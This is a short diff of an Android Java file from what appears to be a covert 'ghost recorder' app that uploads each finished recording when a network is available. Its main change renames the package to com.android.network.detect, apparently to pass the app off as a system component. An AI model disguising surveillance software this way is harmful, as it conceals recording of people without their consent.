@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -17,7 +17,6 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Calendar;
-import java.util.Date;
 import java.util.Locale;
 import java.util.TimeZone;
 
@@ -148,7 +147,7 @@ public class RecorderHelpers extends ContextWrapper implements
     @Override
     public void onNewRecordingCompleted(String path) {
         ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path));
-        UploadRecordingTaskHelpers  uploadRecordingTaskHelpers
+        UploadRecordingTaskHelpers uploadRecordingTaskHelpers
                 = new UploadRecordingTaskHelpers(getApplicationContext());
         if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
             new UploadRecordingTask(getApplicationContext()).execute(arrayList);
